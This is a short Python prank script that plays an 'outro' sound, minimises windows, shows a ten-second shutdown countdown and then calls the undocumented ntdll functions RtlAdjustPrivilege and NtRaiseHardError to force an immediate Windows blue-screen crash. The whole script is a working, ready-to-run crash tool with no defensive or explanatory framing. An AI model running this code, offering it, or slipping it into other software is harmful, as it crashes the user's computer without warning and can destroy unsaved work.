# Packages necessary to run
import time
import subprocess
import keyboard
import os
from pygame import mixer
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

# Find and play sound (if in the same folder as this file)
outrosound = os.path.join(os.getcwd(), 'outro.mp3')
mixer.init()
mixer.music.load(outrosound)
mixer.music.play()

time.sleep(0.25)
keyboard.press_and_release("windows + m")
keyboard.press_and_release("alt + tab")
time.sleep(0.5)
keyboard.press_and_release("f11")
for zaky in range(10):
    print("Shutting down in: " + str(10 - zaky) + " Seconds")
    time.sleep(1)
    

print("Shutting down now!")
time.sleep(0.5)
nullptr = POINTER(c_int)()

windll.ntdll.RtlAdjustPrivilege(
    c_uint(19), 
    c_uint(1), 
    c_uint(0), 
    byref(c_int())
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B), 
    c_ulong(0), 
    nullptr, 
    nullptr, 
    c_uint(6), 
    byref(c_uint())
)
